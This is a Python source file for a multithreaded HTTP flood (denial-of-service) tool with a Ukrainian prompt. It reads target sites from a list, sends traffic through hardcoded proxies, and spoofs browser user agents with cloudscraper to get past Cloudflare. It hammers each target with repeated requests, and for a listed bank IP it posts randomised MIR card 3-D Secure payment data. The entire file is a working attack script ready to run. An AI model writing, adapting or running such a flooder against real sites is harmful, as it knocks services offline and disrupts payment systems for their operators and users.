# -*- coding: utf-8 -*-
import cloudscraper
import requests
import string

from urllib.parse import unquote, urlparse
from gc import collect
from loguru import logger
from sys import stderr
from threading import Thread
from random import choice
from random import randint
from time import sleep
from urllib3 import disable_warnings
from pyuseragents import random as random_useragent
from json import loads

disable_warnings()
logger.remove()
logger.add(stderr, format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>")
threads = int(input('Кількість потоків: '))

ALLOVED_PAREQ_CHARS = string.ascii_letters + string.digits
ALLOVED_MD_CHARS = string.digits

BANK_IPS = ["https://185.170.2.7"]
MAX_REQUESTS = 1000


def base_scraper():
    scraper = cloudscraper.create_scraper(browser={'browser': 'firefox',
                                                   'platform': 'android',
                                                   'mobile': True},)
    scraper.headers.update({
            'Content-Type': 'application/json',
            'cf-visitor': 'https',
            'User-Agent': random_useragent(),
            'Connection': 'keep-alive',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'ru',
            'x-forwarded-proto': 'https',
            'Accept-Encoding': 'gzip, deflate, br'})

    return scraper


def generate_MIR_data(url):
    dat = {}
    dat["PaReq"] = ''.join([choice(ALLOVED_PAREQ_CHARS) for _ in range(490)])
    dat["MD"] = ''.join([choice(ALLOVED_MD_CHARS) for _ in range(10)])
    dat["TermUrl"] = "https%3A%2F%2F" + urlparse(url).netloc
    return dat


def check_proxie(checker, proxy_str):
    scraper = base_scraper()

    scraper.proxies.update({'http': "http://" + (proxy_str + checker),
                            'https': "https://" + (proxy_str + checker)})

    try:
        resp = scraper.get(checker, timeout=0.5)
        if resp.status_code < 200 or resp.status_code > 400:
            return False

        return True
    except:
        return False


def check_taget(target, proxy_str):
    scraper = base_scraper()

    scraper.proxies.update({'http': "http://" + proxy_str + target,
                           'https': "https://" + proxy_str + target})

    try:
        resp = scraper.get(target)
        if resp.status_code > 500:
            return False
    except:
        return False

    return True


def get_proxy(data, checker):
    logger.info("CHECKING GIVEN PROXIES")

    for proxy in data['proxy']:
        auth = proxy["auth"]
        ip = proxy["ip"]

        out_proxy = (auth + "@" + ip + "/")
        if check_proxie(checker, out_proxy):
            return out_proxy
    return None



def mainth():
    current_target = None

    # Fetching data with proxy and targets
    with open('list.txt') as f:
        sites = f.read().splitlines()

    while True:
        scraper = base_scraper()
        logger.info("GET RESOURCES FOR ATTACK")
        # data = choice(sites)
        index_ = randint(0, len(sites) - 1)
        data = sites[index_]

        if current_target is None:
            current_target = unquote(data)

        if current_target.startswith('http') is False:
            current_target = "https://" + current_target

        proxies = [
            'http://193.23.50.206:11335',
            'http://193.23.50.164:10215'
            # 'http://193.23.50.164:10216'
        ]
        cur_proxy = choice(proxies)
        scraper.proxies.update({'http': cur_proxy,
                                'https': cur_proxy})

        logger.info("STARTING ATTACK TO " + current_target)
        for _ in range(MAX_REQUESTS):
            response = {}
            try:
                if current_target in BANK_IPS:
                    response = scraper.post(current_target,
                                            generate_MIR_data(current_target))
                else:
                    response = scraper.get(current_target)
                logger.info("ATTACKED; RESPONSE CODE: " +
                            str(response.status_code) + " " + data)
            except Exception as err:
                logger.warning("GOT ISSUE WHILE ATTACKING " + data)
                # sites.pop(index_)


def cleaner():
    while True:
        sleep(60)
        collect()


if __name__ == '__main__':
    for _ in range(threads):
        Thread(target=mainth).start()

    Thread(target=cleaner, daemon=True).start()
